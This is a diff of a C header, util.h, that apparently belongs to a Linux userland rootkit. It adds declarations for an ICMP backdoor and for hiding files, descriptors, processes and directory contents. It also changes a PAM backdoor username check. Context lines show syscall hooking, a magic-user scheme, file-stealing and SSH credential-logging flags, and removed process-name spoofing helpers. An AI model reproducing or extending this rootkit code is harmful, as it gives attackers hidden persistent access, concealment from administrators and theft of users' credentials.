@@ -1,37 +1,16 @@
 #ifndef _UTIL_H_
 #define _UTIL_H_
-#define HOME_VAR       "HOME="HOMEDIR
-#define BD_SSHPROCNAME "sshd: "BD_UNAME
 
-#define CMDLINE_PATH      "/proc/%d/cmdline"
-#define FALLBACK_PROCNAME "YuuUUU"
-#define NAME_MAXLEN       128     /* max lengths for storing process name */
-#define CMDLINE_MAXLEN    256     /* & cmdline string. */
-
-#define PID_MAXLEN      150
-#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN
-
-#define MODE_NAME     1
-#define MODE_CMDLINE  2
-
-char *get_cmdline(pid_t pid);
-int  open_cmdline(pid_t pid);
-
-char *process_info(pid_t pid, int mode);
-/* macros for the use of process_info() for calling processes. */
-#define process_name()    process_info(getpid(), MODE_NAME)
-#define process_cmdline() process_info(getpid(), MODE_CMDLINE)
-
-int sshdproc(void);
-int cmp_process(char *name);
-char *str_process(char *name);
-int process(char *name);
-#ifdef USE_PAM_BD
-int bd_sshproc(void);
+#ifdef USE_ICMP_BD
+void spawnpdoor(void); // sue me
+int pdoorup(void);
 #endif
-#include "proc.c"
 
-#define isbduname(name) !strncmp(BD_UNAME, name, LEN_BD_UNAME)
+#define HOME_VAR "HOME="HOMEDIR
+
+#include "proc/proc.h"
+
+#define isbduname(name) !strncmp(PAM_UNAME, name, LEN_PAM_UNAME)
 
 #define MAGICUSR 0
 #define NORMLUSR 1
@@ -41,7 +20,7 @@ int chown_path(const char *path, gid_t gid){
     return (long)call(CCHOWN, path, 0, gid);
 }
 
-int notuser(int id){
+int notuser(uid_t id){
     if(getuid() != id && geteuid() != id)
         return 1;
     return 0;
@@ -49,13 +28,14 @@ int notuser(int id){
 
 char *gdirname(int fd){
     int readlink_status;
-    char path[64], *filename = malloc(PATH_MAX);
-    memset(filename, 0, PATH_MAX);
+    char path[128], *filename = malloc(PATH_MAX+1);
+    if(!filename) return NULL;
+    memset(filename, 0, PATH_MAX+1);
 
     snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);
 
     hook(CREADLINK);
-    readlink_status = (long)call(CREADLINK, path, filename, PATH_MAX-1);
+    readlink_status = (long)call(CREADLINK, path, filename, PATH_MAX);
     if(readlink_status < 0) return NULL;
     return filename;
 }
@@ -88,12 +68,6 @@ do{                            \
     }                          \
 }while(0)
 #endif
-
-#ifdef USE_PAM_BD
-#define BASHRC_PATH HOMEDIR"/.bashrc"
-#define PROFILE_PATH HOMEDIR"/.profile"
-#endif
-
 
 /* returns a blocksize for fsize. if MAX_BLOCK_SIZE is defined & the initial
  * blocksize is larger than that value, count is incremented until the blocksize
@@ -141,6 +115,22 @@ FILE *bindup(const char *path, char *newpath, FILE **nfp, off_t *fsize, mode_t *
     return ret;
 }
 
+
+int _hidden_path(const char *pathname, short mode);
+int _f_hidden_path(int fd, short mode);
+int _l_hidden_path(const char *pathname, short mode);
+int hidden_proc(pid_t pid);
+#define MODE_REG 0x32  /* STAT MODE FOR REGULAR FILES. */
+#define MODE_64  0x64  /* STAT MODE FOR BIG FILES. */
+#define hidden_ppid(pid)     hidden_proc(getppid())
+#define hidden_path(path)    _hidden_path(path, MODE_REG)
+#define hidden_path64(path)  _hidden_path(path, MODE_64)
+#define hidden_fd(fd)        _f_hidden_path(fd, MODE_REG)
+#define hidden_fd64(fd)      _f_hidden_path(fd, MODE_64)
+#define hidden_lpath(path)   _l_hidden_path(path, MODE_REG)
+#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)
+
+
 #if defined LOG_SSH || defined LOG_LOCAL_AUTH
 int alreadylogged(const char *logpath, char *logbuf);
 int logcount(const char *path);
@@ -151,6 +141,7 @@ int rknomore(void);
 #include "nomore.c"
 
 void eradicatedir(const char *target);
+void hidedircontents(const char *target, gid_t magicgid);
 #include "magic/magic.h"
 
 #ifdef FILE_STEAL
@@ -166,5 +157,7 @@ void bdprep(void);
 #include "prep.c"
 
 #include "install/install.h"
+
+#include "hiding/hiding.h"
 
 #endif
